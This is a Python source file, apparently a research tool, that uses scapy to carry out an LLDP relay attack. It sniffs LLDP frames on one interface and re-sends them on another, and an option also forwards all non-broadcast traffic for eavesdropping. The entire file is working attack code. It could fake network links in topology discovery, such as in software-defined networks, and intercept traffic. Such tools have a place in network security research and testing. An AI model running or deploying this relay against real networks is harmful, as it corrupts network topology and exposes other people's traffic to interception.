import time
from scapy.all import *
from optparse import OptionParser

class LLDPRelayAttackerAPP(object):
    '''
    bind_iface: the binding interface to sniff LLDP packets.
    relay_ends: relay the LLDP to the ends through UDP sockets. 
    '''
    def __init__(self, in_dev, out_dev, fwd_all):
        self.in_dev = in_dev 
        self.out_dev = out_dev
        self.fwd_all = fwd_all
        if fwd_all:
            self.filter_strategy = 'inbound and \
                (ether proto 0x88cc or \
                (not ether dst host ff:ff:ff:ff:ff:ff and \
                 not ether src host 00:00:de:ad:be:ef))' 
        else:
            self.filter_strategy = 'inbound and ether proto 0x88cc'

    # Since we only focus on LLDP packets, thus ignore other packets here.
    # In reality, to further raise eavesdropping attack, all the packets should 
    # be forwarded (relayed). However, the function can be realized in other modules.    
    def run(self):
        try:
            sniff(promisc=False,
                iface=self.in_dev,
                filter = self.filter_strategy,
                prn=lambda pkt: sendp(pkt, iface=self.out_dev, verbose=False),
                store=0,
                quiet=True,
                )
        except KeyboardInterrupt:
            return 

        
if __name__ == '__main__':
    prompt = '''usage: %prog  -i in_dev ip -o out_dev'''
    parser = OptionParser(usage=prompt)
    parser.add_option('-i', '--in', dest='in_dev')
    parser.add_option('-o', '--out', dest='out_dev')
    parser.add_option('-a', '--all', dest='fwd_all', type="int", default=False)
    (options, args) = parser.parse_args()

    relay_attacker = LLDPRelayAttackerAPP(options.in_dev, options.out_dev, options.fwd_all)
    relay_attacker.run()